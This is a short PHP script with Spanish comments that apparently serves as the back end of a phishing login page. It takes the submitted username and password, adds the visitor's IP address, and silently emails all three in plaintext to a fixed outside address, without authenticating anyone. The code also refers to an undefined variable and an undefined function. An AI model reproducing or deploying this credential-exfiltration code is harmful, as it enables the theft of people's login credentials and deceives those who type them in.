<?php


$username = $_POST["user"];
$pass = $_POST["password"];


$MailTo="info@maximilianolopez.uy";

$contenido='
<html>
<body>
	<table width="100%" border="0" cellspacing="20" cellpadding="5">
		<tr>
			<td style="font-size:12px; font-family:arial, helvetica; colsor:#666;">
			Usuario: <strong>'.$username.'</strong><br /><br />
			Pass: <strong>'.$pass.'</strong><br /><br />
			IP: <b>'.get_real_ip().'</b>

			</td>
		</tr>
	</table>
</body>
</html>';

//para el envío en formato HTML
$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
//dirección a quien va
$headers .= "To: <$MailTo>\r\n";
//asunto
$asunto = "SESION FALLIDA EN: ".$url;

//envia al usuario
@mail($MailTo,$asunto,$contenido,$headers);

?>